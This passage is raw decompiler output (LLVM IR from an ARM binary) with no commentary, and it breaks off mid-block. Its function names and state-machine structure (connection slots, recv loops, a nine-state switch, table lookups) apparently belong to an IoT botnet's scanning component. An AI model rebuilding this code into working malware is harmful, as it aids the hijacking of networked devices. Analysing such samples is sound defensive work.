  store i32 %v3_ee18, i32* %r3.global-to-local, align 4
  %v2_ee1c = icmp ugt i32 %v3_ee18, 1
  store i1 %v2_ee1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee1c = icmp eq i32 %v3_ee18, 2
  store i1 %v7_ee1c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee20 = xor i1 %v2_ee1c, true
  %v3_ee20 = or i1 %v7_ee1c, %v2_ee20
  br i1 %v3_ee20, label %bb415, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_ee10
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee28298302 = add i32 %v0_ee18, 4
  %v3_ee28299303 = inttoptr i32 %v2_ee28298302 to i32*
  store i32 -1, i32* %v3_ee28299303, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_ee10
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee28295 = add i32 %v0_ee18, 4
  %v3_ee28296 = inttoptr i32 %v2_ee28295 to i32*
  store i32 -1, i32* %v3_ee28296, align 4
  %v4_ee2c = load i32, i32* %r3.global-to-local, align 4
  %v5_ee2c = load i32, i32* @r4, align 4
  %v6_ee2c = add i32 %v5_ee2c, 12
  %v7_ee2c = inttoptr i32 %v6_ee2c to i32*
  store i32 %v4_ee2c, i32* %v7_ee2c, align 4
  %v4_ee30 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee30 = trunc i32 %v4_ee30 to i8
  %v6_ee30 = load i32, i32* @r4, align 4
  %v7_ee30 = add i32 %v6_ee30, 284
  %v8_ee30 = inttoptr i32 %v7_ee30 to i8*
  store i8 %v5_ee30, i8* %v8_ee30, align 1
  %v0_ee34.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ee34.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread301, %bb415
  %v1_ee34 = phi i1 [ %v1_ee34.pre, %bb415 ], [ %v2_ee1c, %.thread301 ]
  %v0_ee34 = phi i1 [ %v0_ee34.pre, %bb415 ], [ false, %.thread301 ]
  %v2_ee34 = xor i1 %v1_ee34, true
  %v3_ee34 = or i1 %v0_ee34, %v2_ee34
  br i1 %v3_ee34, label %bb410, label %dec_label_pc_ee38

dec_label_pc_ee38:                                ; preds = %bb416
  %v0_ee38 = load i32, i32* @r4, align 4
  %v1_ee38 = add i32 %v0_ee38, 284
  %v2_ee38 = inttoptr i32 %v1_ee38 to i8*
  %v3_ee38 = load i8, i8* %v2_ee38, align 1
  %v4_ee38 = zext i8 %v3_ee38 to i32
  %v1_ee3c = add nuw nsw i32 %v4_ee38, 1
  %v1_ee40 = urem i32 %v1_ee3c, 256
  store i32 %v1_ee40, i32* %r3.global-to-local, align 4
  %v2_ee44 = icmp ugt i32 %v1_ee40, 9
  store i1 %v2_ee44, i1* %cpsr_c.global-to-local, align 1
  %v7_ee44 = icmp eq i32 %v1_ee40, 10
  store i1 %v7_ee44, i1* %cpsr_z.global-to-local, align 1
  %v1_ee48 = trunc i32 %v1_ee3c to i8
  store i8 %v1_ee48, i8* %v2_ee38, align 1
  %v0_ee4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee4c, label %.thread75, label %dec_label_pc_ee5c

.thread75:                                        ; preds = %dec_label_pc_ee38
  %v1_ee4c = load i32, i32* %r3.global-to-local, align 4
  %v2_ee4c = add i32 %v1_ee4c, -10
  store i32 %v2_ee4c, i32* %r3.global-to-local, align 4
  %v2_ee50 = load i32, i32* @r4, align 4
  %v3_ee50 = add i32 %v2_ee50, 12
  %v4_ee50 = inttoptr i32 %v3_ee50 to i32*
  store i32 %v2_ee4c, i32* %v4_ee50, align 4
  %v1_ee54 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee54 = trunc i32 %v1_ee54 to i8
  %v3_ee54 = load i32, i32* @r4, align 4
  %v4_ee54 = add i32 %v3_ee54, 284
  %v5_ee54 = inttoptr i32 %v4_ee54 to i8*
  store i8 %v2_ee54, i8* %v5_ee54, align 1
  %v0_ee58.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee58.pr.pr, label %bb410, label %dec_label_pc_ee5c

dec_label_pc_ee5c:                                ; preds = %dec_label_pc_ee38, %.thread75
  %v0_ee5c = load i32, i32* @r4, align 4
  store i32 %v0_ee5c, i32* @r0, align 4
  %v0_ee60 = call i32 @setup_connection()
  store i32 %v0_ee60, i32* %r0.global-to-local, align 4
  br label %bb410

dec_label_pc_ee68:                                ; preds = %dec_label_pc_ed7c
  store i32 %v3_ee68, i32* %r0.global-to-local, align 4
  %v3_ee6c = udiv i32 %v3_ee68, 32
  %v3_ee70 = mul nuw nsw i32 %v3_ee6c, 4
  store i32 %v2_ee74, i32* @lr, align 4
  %v2_ee78 = add i32 %v3_ee70, %v2_ee74
  store i32 %v2_ee78, i32* %r3.global-to-local, align 4
  %v1_ee7c = add i32 %v2_ee78, -312
  %v2_ee7c = inttoptr i32 %v1_ee7c to i32*
  %v3_ee7c = load i32, i32* %v2_ee7c, align 4
  %v1_ee80 = urem i32 %v3_ee68, 32
  store i32 %v1_ee80, i32* %r1.global-to-local, align 4
  %v7_ee84 = shl i32 1, %v1_ee80
  %v8_ee84 = or i32 %v3_ee7c, %v7_ee84
  store i32 %v8_ee84, i32* %r2.global-to-local, align 4
  %v0_ee88 = load i32, i32* @r5, align 4
  %v3_ee88 = icmp uge i32 %v0_ee88, %v3_ee68
  store i1 %v3_ee88, i1* %cpsr_c.global-to-local, align 1
  %v9_ee88 = icmp eq i32 %v0_ee88, %v3_ee68
  store i1 %v9_ee88, i1* %cpsr_z.global-to-local, align 1
  %v5_ee8c = icmp slt i32 %v0_ee88, %v3_ee68
  br i1 %v5_ee8c, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_ee68
  store i32 %v3_ee68, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_ee68, %bb417
  store i32 %v8_ee84, i32* %v2_ee7c, align 4
  br label %bb410

dec_label_pc_ee98:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_eea4 = load i32, i32* @r5, align 4
  %v1_eea4 = load i32, i32* @r6, align 4
  %v3_eea4 = icmp uge i32 %v0_eea4, %v1_eea4
  store i1 %v3_eea4, i1* %cpsr_c.global-to-local, align 1
  %v9_eea4 = icmp eq i32 %v0_eea4, %v1_eea4
  store i1 %v9_eea4, i1* %cpsr_z.global-to-local, align 1
  %v5_eea8 = icmp slt i32 %v0_eea4, %v1_eea4
  %storemerge155 = select i1 %v5_eea8, i32 %v1_eea4, i32 %v0_eea4
  store i32 %v2_eebc, i32* %ip.global-to-local, align 4
  store i32 %v2_eec0, i32* %r1.global-to-local, align 4
  store i32 %v2_eec4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_eecc = add i32 %storemerge155, 1
  store i32 %v1_eecc, i32* %r0.global-to-local, align 4
  %v5_eed8 = call i32 @__libc_select(i32 %v1_eecc, i32 %v2_eec0, i32 %v2_eec4, i32 0, i32 %v2_eebc)
  %v0_eedc = load i32, i32* @r4, align 4
  store i32 %v0_eedc, i32* %r0.global-to-local, align 4
  %v1_eee0 = inttoptr i32 %v0_eedc to i32*
  %v2_eee0 = call i32 @__GI_time(i32* %v1_eee0)
  store i32 %v2_eee0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21908.135 to i32), i32* @lr, align 4
  %v0_eee8 = load i32, i32* @r4, align 4
  store i32 %v0_eee8, i32* %stack_var_-52, align 4
  store i32 %v2_eee0, i32* @global_var_21908.135, align 4
  br label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %dec_label_pc_f058, %dec_label_pc_ee98
  %v0_eefc = phi i32 [ %v1_f05c, %dec_label_pc_f058 ], [ %v0_eee8, %dec_label_pc_ee98 ]
  store i32 ptrtoint (i32* @global_var_243ec.147 to i32), i32* %r0.global-to-local, align 4
  %v3_eef4 = mul i32 %v0_eefc, 256
  store i32 %v3_eef4, i32* %r3.global-to-local, align 4
  %v2_eef8 = load i32, i32* @global_var_243ec.147, align 4
  store i32 %v2_eef8, i32* %r1.global-to-local, align 4
  %v2_ef00 = mul i32 %v0_eefc, 288
  store i32 %v2_ef00, i32* %r2.global-to-local, align 4
  %v2_ef04 = add i32 %v2_eef8, %v2_ef00
  store i32 %v2_ef04, i32* @r6, align 4
  %v1_ef08 = add i32 %v2_ef04, 4
  %v2_ef08 = inttoptr i32 %v1_ef08 to i32*
  %v3_ef08 = load i32, i32* %v2_ef08, align 4
  store i32 %v3_ef08, i32* %r0.global-to-local, align 4
  %v2_ef0c = icmp eq i32 %v3_ef08, -1
  store i1 %v2_ef0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef0c = icmp eq i32 %v3_ef08, -1
  store i1 %v7_ef0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef0c, label %dec_label_pc_f058, label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eef0
  %v3_ef14 = udiv i32 %v3_ef08, 32
  store i32 %v2_ee74, i32* %r1.global-to-local, align 4
  %v3_ef1c = mul nuw nsw i32 %v3_ef14, 4
  store i32 %v3_ef1c, i32* @ip, align 4
  %v2_ef20 = add i32 %v3_ef1c, %v2_ee74
  store i32 %v2_ef20, i32* %r2.global-to-local, align 4
  %v1_ef24 = add i32 %v2_ef20, -312
  %v2_ef24 = inttoptr i32 %v1_ef24 to i32*
  %v3_ef24 = load i32, i32* %v2_ef24, align 4
  %v1_ef28 = urem i32 %v3_ef08, 32
  store i32 %v1_ef28, i32* %r1.global-to-local, align 4
  %v2_ef2c = add nsw i32 %v1_ef28, -1
  %v3_ef2c = shl i32 1, %v2_ef2c
  %v4_ef2c = and i32 %v3_ef24, %v3_ef2c
  %v5_ef2c = icmp ne i32 %v4_ef2c, 0
  store i1 %v5_ef2c, i1* %cpsr_c.global-to-local, align 1
  %v6_ef2c = ashr i32 %v3_ef24, %v1_ef28
  store i32 %v6_ef2c, i32* %r3.global-to-local, align 4
  %v1_ef30 = urem i32 %v6_ef2c, 2
  %v2_ef30 = icmp eq i32 %v1_ef30, 0
  store i1 %v2_ef30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef30, label %dec_label_pc_ef38, label %dec_label_pc_fa60

dec_label_pc_ef38:                                ; preds = %dec_label_pc_ef14, %dec_label_pc_fb0c
  %v1_ef44 = phi i32 [ %v1_ef28, %dec_label_pc_ef14 ], [ %v1_ef44.pre, %dec_label_pc_fb0c ]
  %v0_ef3c = phi i32 [ %v3_ef1c, %dec_label_pc_ef14 ], [ %v0_ef3c.pre, %dec_label_pc_fb0c ]
  store i32 %v2_ee74, i32* @lr, align 4
  %v2_ef3c = add i32 %v0_ef3c, %v2_ee74
  store i32 %v2_ef3c, i32* %r2.global-to-local, align 4
  %v1_ef40 = add i32 %v2_ef3c, -184
  %v2_ef40 = inttoptr i32 %v1_ef40 to i32*
  %v3_ef40 = load i32, i32* %v2_ef40, align 4
  %v2_ef44 = add i32 %v1_ef44, -1
  %v3_ef44 = shl i32 1, %v2_ef44
  %v4_ef44 = and i32 %v3_ef40, %v3_ef44
  %v5_ef44 = icmp ne i32 %v4_ef44, 0
  store i1 %v5_ef44, i1* %cpsr_c.global-to-local, align 1
  %v6_ef44 = ashr i32 %v3_ef40, %v1_ef44
  store i32 %v6_ef44, i32* %r3.global-to-local, align 4
  %v1_ef48 = urem i32 %v6_ef44, 2
  %v2_ef48 = icmp eq i32 %v1_ef48, 0
  store i1 %v2_ef48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef48, label %dec_label_pc_f058, label %dec_label_pc_ef50.preheader

dec_label_pc_ef50.preheader:                      ; preds = %dec_label_pc_ef38
  %v0_ef50176 = load i32, i32* @r6, align 4
  %v1_ef50177 = add i32 %v0_ef50176, 12
  %v2_ef50178 = inttoptr i32 %v1_ef50177 to i32*
  %v3_ef50179 = load i32, i32* %v2_ef50178, align 4
  store i32 %v3_ef50179, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef54175181 = icmp eq i32 %v3_ef50179, 0
  store i1 %v2_ef54175181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef54175181, label %dec_label_pc_f058, label %dec_label_pc_ef5c.lr.ph

dec_label_pc_ef50.loopexit:                       ; preds = %dec_label_pc_f964, %dec_label_pc_f768
  %v0_ef50 = load i32, i32* @r6, align 4
  %v1_ef50 = add i32 %v0_ef50, 12
  %v2_ef50 = inttoptr i32 %v1_ef50 to i32*
  %v3_ef50 = load i32, i32* %v2_ef50, align 4
  store i32 %v3_ef50, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef54175 = icmp eq i32 %v3_ef50, 0
  store i1 %v2_ef54175, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef54175, label %dec_label_pc_f058, label %dec_label_pc_ef5c.lr.ph

dec_label_pc_ef5c.lr.ph:                          ; preds = %dec_label_pc_ef50.preheader, %dec_label_pc_ef50.loopexit
  %v0_ef5c231 = phi i32 [ %v0_ef50, %dec_label_pc_ef50.loopexit ], [ %v0_ef50176, %dec_label_pc_ef50.preheader ]
  br label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef54.backedge.thread, %dec_label_pc_ef54.backedge, %dec_label_pc_ef54.backedge.thread561, %dec_label_pc_ef5c.lr.ph
  %v0_fa30 = phi i32 [ %v0_ef5c231, %dec_label_pc_ef5c.lr.ph ], [ %v0_ef5c228, %dec_label_pc_ef54.backedge ], [ %v0_efd0, %dec_label_pc_ef54.backedge.thread ], [ %v0_efd0, %dec_label_pc_ef54.backedge.thread561 ]
  %v1_ef5c = add i32 %v0_fa30, 24
  %v2_ef5c = inttoptr i32 %v1_ef5c to i32*
  %v3_ef5c = load i32, i32* %v2_ef5c, align 4
  store i32 %v3_ef5c, i32* @r3, align 4
  %v2_ef60 = icmp ugt i32 %v3_ef5c, 255
  store i1 %v2_ef60, i1* %cpsr_c.global-to-local, align 1
  %v7_ef60 = icmp eq i32 %v3_ef5c, 256
  store i1 %v7_ef60, i1* %cpsr_z.global-to-local, align 1
  %.pre282 = add i32 %v0_fa30, 28
  store i32 %.pre282, i32* @sb, align 4
  br i1 %v7_ef60, label %dec_label_pc_fa30, label %dec_label_pc_ef6c

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_ef5c, %dec_label_pc_fa30
  store i32 0, i32* @r5, align 4
  %v1_ef70 = load i32, i32* @fp, align 4
  %v2_ef70 = inttoptr i32 %v1_ef70 to i32*
  store i32 0, i32* %v2_ef70, align 4
  %v0_ef74 = load i32, i32* @r6, align 4
  %v1_ef74 = add i32 %v0_ef74, 24
  %v2_ef74 = inttoptr i32 %v1_ef74 to i32*
  %v3_ef74 = load i32, i32* %v2_ef74, align 4
  store i32 %v3_ef74, i32* %r2.global-to-local, align 4
  %v0_ef78 = load i32, i32* @sb, align 4
  %v2_ef78 = add i32 %v0_ef78, %v3_ef74
  store i32 %v2_ef78, i32* @r4, align 4
  %v1_ef7c = add i32 %v0_ef74, 4
  %v2_ef7c = inttoptr i32 %v1_ef7c to i32*
  %v3_ef7c = load i32, i32* %v2_ef7c, align 4
  store i32 %v3_ef7c, i32* %r0.global-to-local, align 4
  %v1_ef80 = sub i32 256, %v3_ef74
  store i32 %v1_ef80, i32* %r2.global-to-local, align 4
  store i32 %v2_ef78, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef8c = call i32 @__libc_recv(i32 %v3_ef7c, i32 %v2_ef78, i32 %v1_ef80, i32 16384)
  store i32 %v4_ef8c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef90 = icmp eq i32 %v4_ef8c, 0
  store i1 %v2_ef90, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_ef8c, 1
  br i1 %tmp419, label %dec_label_pc_f008, label %dec_label_pc_ef98

dec_label_pc_ef98:                                ; preds = %dec_label_pc_ef6c
  %v0_ef98 = load i32, i32* @r5, align 4
  store i32 %v0_ef98, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef9c

dec_label_pc_ef9c:                                ; preds = %.thread82, %dec_label_pc_ef98
  %v3_efa8 = phi i32 [ %v1_efac, %.thread82 ], [ %v0_ef98, %dec_label_pc_ef98 ]
  %v1_ef9c = load i32, i32* @r4, align 4
  %v2_ef9c = add i32 %v1_ef9c, %v3_efa8
  %v3_ef9c = inttoptr i32 %v2_ef9c to i8*
  %v4_ef9c = load i8, i8* %v3_ef9c, align 1
  %v6_ef9c = zext i8 %v4_ef9c to i32
  store i32 %v6_ef9c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efa0 = icmp eq i8 %v4_ef9c, 0
  store i1 %v2_efa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_efa0, label %bb420, label %.thread82

bb420:                                            ; preds = %dec_label_pc_ef9c
  %v2_efa4 = add nuw nsw i32 %v6_ef9c, 65
  store i32 %v2_efa4, i32* %r3.global-to-local, align 4
  %v2_efa8 = trunc i32 %v2_efa4 to i8
  store i8 %v2_efa8, i8* %v3_ef9c, align 1
  %v0_efac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread82

.thread82:                                        ; preds = %dec_label_pc_ef9c, %bb420
  %v0_efac = phi i32 [ %v3_efa8, %dec_label_pc_ef9c ], [ %v0_efac.pre, %bb420 ]
  %v1_efac = add i32 %v0_efac, 1
  store i32 %v1_efac, i32* %r2.global-to-local, align 4
  %v3_efb0 = icmp uge i32 %v1_efac, %v4_ef8c
  store i1 %v3_efb0, i1* %cpsr_c.global-to-local, align 1
  %v9_efb0 = icmp eq i32 %v1_efac, %v4_ef8c
  store i1 %v9_efb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efb0, label %dec_label_pc_efb8, label %dec_label_pc_ef9c

dec_label_pc_efb8:                                ; preds = %.thread82, %dec_label_pc_f00c
  store i32 ptrtoint (i32* @global_var_21908.135 to i32), i32* %r1.global-to-local, align 4
  %v0_efbc = load i32, i32* @r6, align 4
  %v1_efbc = add i32 %v0_efbc, 24
  %v2_efbc = inttoptr i32 %v1_efbc to i32*
  %v3_efbc = load i32, i32* %v2_efbc, align 4
  %v2_efc0 = load i32, i32* @global_var_21908.135, align 4
  store i32 %v2_efc0, i32* %r2.global-to-local, align 4
  %v2_efc4 = add i32 %v3_efbc, %v4_ef8c
  store i32 %v2_efc4, i32* %r3.global-to-local, align 4
  store i32 %v2_efc4, i32* %v2_efbc, align 4
  %v0_efcc = load i32, i32* %r2.global-to-local, align 4
  %v1_efcc = load i32, i32* @r6, align 4
  %v2_efcc = add i32 %v1_efcc, 8
  %v3_efcc = inttoptr i32 %v2_efcc to i32*
  store i32 %v0_efcc, i32* %v3_efcc, align 4
  br label %dec_label_pc_efd0

dec_label_pc_efd0:                                ; preds = %dec_label_pc_f0ec, %dec_label_pc_efb8
  %v0_efd0 = load i32, i32* @r6, align 4
  %v1_efd0 = add i32 %v0_efd0, 12
  %v2_efd0 = inttoptr i32 %v1_efd0 to i32*
  %v3_efd0 = load i32, i32* %v2_efd0, align 4
  store i32 %v3_efd0, i32* %r0.global-to-local, align 4
  %v1_efd4 = add i32 %v3_efd0, -2
  store i32 %v1_efd4, i32* @r3, align 4
  %v7_efd8 = icmp eq i32 %v1_efd4, 8
  store i1 %v7_efd8, i1* %cpsr_z.global-to-local, align 1
  %v5_efdc = and i32 %v1_efd4, 1073741824
  %v6_efdc = icmp ne i32 %v5_efdc, 0
  store i1 %v6_efdc, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_efd0, label %dec_label_pc_ef54.backedge [
    i32 2, label %dec_label_pc_f2bc
    i32 3, label %dec_label_pc_f774
    i32 4, label %dec_label_pc_f680
    i32 5, label %dec_label_pc_f460
    i32 6, label %dec_label_pc_f38c
    i32 7, label %dec_label_pc_f5ac
    i32 8, label %dec_label_pc_f1e8
    i32 9, label %dec_label_pc_f114
    i32 10, label %dec_label_pc_f070
  ]

dec_label_pc_f008:                                ; preds = %dec_label_pc_ef6c
  br i1 %v2_ef90, label %dec_label_pc_fb60, label %dec_label_pc_f00c

dec_label_pc_f00c:                                ; preds = %dec_label_pc_f008
  %v3_f00c = icmp eq i32 %v4_ef8c, -1
  store i1 %v3_f00c, i1* %cpsr_c.global-to-local, align 1
  %v8_f00c = icmp eq i32 %v4_ef8c, -1
  store i1 %v8_f00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f00c, label %dec_label_pc_f014, label %dec_label_pc_efb8

dec_label_pc_f014:                                ; preds = %dec_label_pc_f00c
  %v0_f014 = load i32, i32* @fp, align 4
  %v1_f014 = inttoptr i32 %v0_f014 to i32*
  %v2_f014 = load i32, i32* %v1_f014, align 4
  store i32 %v2_f014, i32* %r3.global-to-local, align 4
  %v2_f018 = icmp ugt i32 %v2_f014, 10
  store i1 %v2_f018, i1* %cpsr_c.global-to-local, align 1
  %v7_f018 = icmp eq i32 %v2_f014, 11
  store i1 %v7_f018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f018, label %dec_label_pc_f058, label %dec_label_pc_f020

dec_label_pc_f020:                                ; preds = %dec_label_pc_f014, %dec_label_pc_fb60
  %v0_f020 = load i32, i32* @r6, align 4
  %v1_f020 = add i32 %v0_f020, 4
  %v2_f020 = inttoptr i32 %v1_f020 to i32*
  %v3_f020 = load i32, i32* %v2_f020, align 4
  store i32 %v3_f020, i32* %r0.global-to-local, align 4
  %v1_f024 = call i32 @__GI___libc_close(i32 %v3_f020)
  store i32 %v1_f024, i32* %r0.global-to-local, align 4
  %v0_f028 = load i32, i32* @r6, align 4
  %v1_f028 = add i32 %v0_f028, 284
  %v2_f028 = inttoptr i32 %v1_f028 to i8*
  %v3_f028 = load i8, i8* %v2_f028, align 1
  %v4_f028 = zext i8 %v3_f028 to i32
  %v1_f02c = add nuw nsw i32 %v4_f028, 1
  %v1_f030 = urem i32 %v1_f02c, 256
  store i32 %v1_f030, i32* %r3.global-to-local, align 4
  %v2_f034 = icmp ugt i32 %v1_f030, 8
  store i1 %v2_f034, i1* %cpsr_c.global-to-local, align 1
  %v7_f034 = icmp eq i32 %v1_f030, 9
  store i1 %v7_f034, i1* %cpsr_z.global-to-local, align 1
  %v1_f038 = trunc i32 %v1_f02c to i8
  store i8 %v1_f038, i8* %v2_f028, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f040 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f040 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f040 = xor i1 %v1_f040, true
  %v3_f040 = and i1 %v0_f040, %v2_f040
  br i1 %v3_f040, label %bb421, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_f020
  %v1_f044309314 = load i32, i32* @r6, align 4
  %v2_f044310315 = add i32 %v1_f044309314, 4
  %v3_f044311316 = inttoptr i32 %v2_f044310315 to i32*
  store i32 -1, i32* %v3_f044311316, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_f020
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f044305 = load i32, i32* @r6, align 4
  %v2_f044306 = add i32 %v1_f044305, 4
  %v3_f044307 = inttoptr i32 %v2_f044306 to i32*
  store i32 -1, i32* %v3_f044307, align 4
  %v4_f048 = load i32, i32* %r3.global-to-local, align 4
  %v5_f048 = load i32, i32* @r6, align 4
  %v6_f048 = add i32 %v5_f048, 12
  %v7_f048 = inttoptr i32 %v6_f048 to i32*
  store i32 %v4_f048, i32* %v7_f048, align 4
  %v4_f04c = load i32, i32* %r3.global-to-local, align 4
  %v5_f04c = trunc i32 %v4_f04c to i8
  %v6_f04c = load i32, i32* @r6, align 4
  %v7_f04c = add i32 %v6_f04c, 284
  %v8_f04c = inttoptr i32 %v7_f04c to i8*
  store i8 %v5_f04c, i8* %v8_f04c, align 1
  %v0_f050.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f050.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread313, %bb421
  %v1_f054 = phi i1 [ %v1_f050.pre, %bb421 ], [ %v0_f040, %.thread313 ]
  %v0_f054 = phi i1 [ %v0_f050.pre, %bb421 ], [ %v1_f040, %.thread313 ]
  %v2_f050 = xor i1 %v1_f054, true
  %v3_f050 = or i1 %v0_f054, %v2_f050
  br i1 %v3_f050, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  %v4_f050 = load i32, i32* @r6, align 4
  store i32 %v4_f050, i32* %r0.global-to-local, align 4
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 61528, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f050, i32 ptrtoint (i32* @global_var_e344.199 to i32))
  br label %dec_label_pc_f058

dec_label_pc_f058:                                ; preds = %dec_label_pc_ef50.loopexit, %dec_label_pc_ef54.backedge, %dec_label_pc_ef50.preheader, %dec_label_pc_f014, %dec_label_pc_ef38, %dec_label_pc_eef0, %dec_label_pc_fb44, %bb424
  %v3_f058 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f058, i32* %r3.global-to-local, align 4
  %v1_f05c = add i32 %v3_f058, 1
  store i32 %v1_f05c, i32* @r4, align 4
  %v2_f060 = icmp ugt i32 %v1_f05c, 254
  store i1 %v2_f060, i1* %cpsr_c.global-to-local, align 1
  %v7_f060 = icmp eq i32 %v1_f05c, 255
  store i1 %v7_f060, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f05c, i32* %stack_var_-52, align 4
  %v7_f068 = icmp slt i32 %v1_f05c, 256
  br i1 %v7_f068, label %dec_label_pc_eef0, label %dec_label_pc_e870

dec_label_pc_f070:                                ; preds = %dec_label_pc_efd0
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f074 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_f084 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_f088 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f084, i32* %r2.global-to-local, align 4
  %v1_f090 = add i32 %v3_f088, -1
  store i32 %v1_f090, i32* %r3.global-to-local, align 4
  %v0_f094 = load i32, i32* @sb, align 4
  store i32 %v0_f094, i32* %r0.global-to-local, align 4
  %v0_f098 = load i32, i32* @r6, align 4
  %v1_f098 = add i32 %v0_f098, 24
  %v2_f098 = inttoptr i32 %v1_f098 to i32*
  %v3_f098 = load i32, i32* %v2_f098, align 4
  store i32 %v3_f098, i32* %r1.global-to-local, align 4
  %v4_f09c = call i32 @util_memsearch(i32 %v0_f094, i32 %v3_f098, i32 %v3_f084, i32 %v1_f090)
  %v2_f0a0 = icmp eq i32 %v4_f09c, -1
  store i1 %v2_f0a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0a0 = icmp eq i32 %v4_f09c, -1
  store i1 %v7_f0a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_f09c, i32* @r4, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f968 = call i32 @table_lock_val(i32 10)
  br i1 %v7_f0a0, label %dec_label_pc_f964, label %dec_label_pc_f0ac

dec_label_pc_f0ac:                                ; preds = %dec_label_pc_f070
  store i32 %v1_f968, i32* %r0.global-to-local, align 4
  %v0_f0b4 = load i32, i32* @r6, align 4
  %v1_f0b4 = add i32 %v0_f0b4, 4
  %v2_f0b4 = inttoptr i32 %v1_f0b4 to i32*
  %v3_f0b4 = load i32, i32* %v2_f0b4, align 4
  store i32 %v3_f0b4, i32* %r0.global-to-local, align 4
  %v1_f0b8 = call i32 @__GI___libc_close(i32 %v3_f0b4)
  store i32 %v1_f0b8, i32* %r0.global-to-local, align 4
  %v0_f0bc = load i32, i32* @r6, align 4
  %v1_f0bc = add i32 %v0_f0bc, 284
  %v2_f0bc = inttoptr i32 %v1_f0bc to i8*
  %v3_f0bc = load i8, i8* %v2_f0bc, align 1
  %v4_f0bc = zext i8 %v3_f0bc to i32
  %v1_f0c0 = add nuw nsw i32 %v4_f0bc, 1
  %v1_f0c4 = urem i32 %v1_f0c0, 256
  store i32 %v1_f0c4, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f0cc = icmp ugt i32 %v1_f0c4, 9
  store i1 %v2_f0cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f0cc = icmp eq i32 %v1_f0c4, 10
  store i1 %v7_f0cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f0d0 = add i32 %v0_f0bc, 4
  %v3_f0d0 = inttoptr i32 %v2_f0d0 to i32*
  store i32 -1, i32* %v3_f0d0, align 4
  %v0_f0d4 = load i32, i32* @r3, align 4
  %v1_f0d4 = trunc i32 %v0_f0d4 to i8
  %v2_f0d4 = load i32, i32* @r6, align 4
  %v3_f0d4 = add i32 %v2_f0d4, 284
  %v4_f0d4 = inttoptr i32 %v3_f0d4 to i8*
  store i8 %v1_f0d4, i8* %v4_f0d4, align 1
  %v0_f0d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0d8, label %dec_label_pc_f0dc, label %dec_label_pc_fa54

dec_label_pc_f0dc:                                ; preds = %dec_label_pc_f0ac
  store i32 0, i32* @r3, align 4
  %v1_f0e0 = load i32, i32* @r6, align 4
